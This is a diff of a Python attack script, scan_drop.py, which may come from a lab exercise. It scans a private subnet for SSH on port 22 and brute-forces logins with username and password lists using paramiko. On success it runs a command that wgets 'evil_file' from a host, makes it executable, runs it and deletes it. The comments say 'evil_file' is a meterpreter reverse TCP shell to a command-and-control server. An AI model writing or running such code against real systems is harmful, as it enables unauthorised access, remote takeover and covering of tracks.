@@ -4,15 +4,15 @@ import time
 import warnings
 
 # scan_drop.py functions
-# 1. Scans target network for nodes running ssh services on port 22.
-# 2. If target found, dictionary attack.
-# 3. If successful, "wget" a file from evil web server.
-# 4. Run "evil_file".
-# 5. Finally, delete "evil_file" & disconnect.
+# 1. scans target network for nodes running ssh services on port 22.
+# 2. if target found, dictionary attack.
+# 3. if successful, "wget" a file from evil web server.
+# 4. run "evil_file".
+# 5. finally, delete "evil_file" & disconnect.
 
 # evil_file functions
-# 1. "evil_file" is a meterpreter reverse tcp shell to C&C.
-# 2. C&C takes over.
+# 1. "evil_file" is a binary meterpreter tcp reverse shell to C&C.
+# 2. C&C takes over while scan_drop.py disconnects.
 
 # remove depracated warnings
 warnings.filterwarnings(action='ignore',module='.*paramiko.*')
@@ -24,7 +24,6 @@ jobs = []
 num = 0
 num2 = 0
 
-
 def ssh_start():
     ip = "192.168.203.%d" % i
 #    print "Connecting:", ip, user_list[num] + pass_list[num2]
@@ -32,7 +31,7 @@ def ssh_start():
     p.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try:
         p.connect(ip, username=user_list[num], password=pass_list[num2])
-        stdin, stdout, stderr = p.exec_command('wget "192.168.203.1/x.sh"; chmod 755 x.sh; ./x.sh; sleep 1')
+        stdin, stdout, stderr = p.exec_command('wget "192.168.203.1/evil_file" -O /tmp ; chmod 755 evil_file; /tmp/./evil_file; sleep 1; rm /tmp/evil_file')
         for line in stdout:
             print(line.strip('\n'))
         for line in stderr:
@@ -49,7 +48,4 @@ for i in range(150,155):
             #p.join()
             num2 += 1
     num += 1
-
     time.sleep(1)
-
-
